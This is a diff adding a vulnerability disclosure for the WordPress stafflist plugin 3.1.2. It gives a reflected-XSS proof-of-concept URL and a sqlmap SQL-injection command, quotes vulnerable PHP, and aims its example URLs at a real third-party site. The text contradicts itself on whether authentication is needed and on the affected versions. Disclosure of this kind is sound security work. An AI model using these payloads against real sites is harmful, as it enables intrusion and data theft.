@@ -1,0 +1,61 @@
+# Exploit Title: WordPress Plugin stafflist 3.1.2 - Reflected XSS (Authenticated)
+# Exploit Author: Xien Genesis
+# Vendor Homepage: https://wordpress.org/plugins/stafflist/
+# Version: 3.1.2
+# Tested on: Firefox
+ 
+# Summary:
+ 
+A cross site scripting reflected vulnerability has been identified in
+WordPress Plugin stafflist version less then 3.1.2. that allows
+unauthenticated users to run arbitrary javascript code inside
+WordPress using Stafflist Plugin.
+ 
+# POC
+ 
+https://www.assumption.edu.ph/wp-login.php?page=stafflist&remove=1&p=1%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+ 
+# Vulnerable Parameters
+ 
+p and s parameters are vulnerable.
+ 
+# Vulnerable Code:
+ 
+$html = ($cur > 1 ? "<p class='pager'><a
+href='{$stafflisturl}&p=".($cur-1)."&s={$_GET['s']}'>Previous
+</a></p>" : ""); //<
+ 
+
+# Exploit Title: WordPress Plugin stafflist 3.1.2 - SQL Injection
+(Authenticated)
+# Exploit Author: Xien Genesis
+# Vendor Homepage: https://wordpress.org/plugins/stafflist/
+# Version: 3.1.2
+# Tested on: Firefox
+ 
+# Vulnerable Code:
+ 
+$w = (isset($_GET['search']) && (string) trim($_GET['search'])!="" ?
+...
+  $where = ($w ? "WHERE LOWER(lastname) LIKE '%{$w}%' OR
+      LOWER(firstname) LIKE '%{$w}%' OR
+      LOWER(department)  LIKE '%{$w}%' OR
+      LOWER(email) LIKE '%{$w}%'" : "");
+ 
+ 
+# Vulnerable URL
+ 
+https://www.assumption.edu.ph/wp-login.php?page=stafflist&search=[SQLI]
+ 
+# POC
+ 
+```
+sqlmap -u 'http://localhost:10003/wp-admin/admin.php?page=stafflist&search=test*'
+--cookie="wordpress_cookies_paste_here"
+```
+ 
+# POC Image
+ 
+https://prnt.sc/AECcFRHhe2ib
+ 
+#  Genesis-Xien-Bermejo [2022-05-05]  #
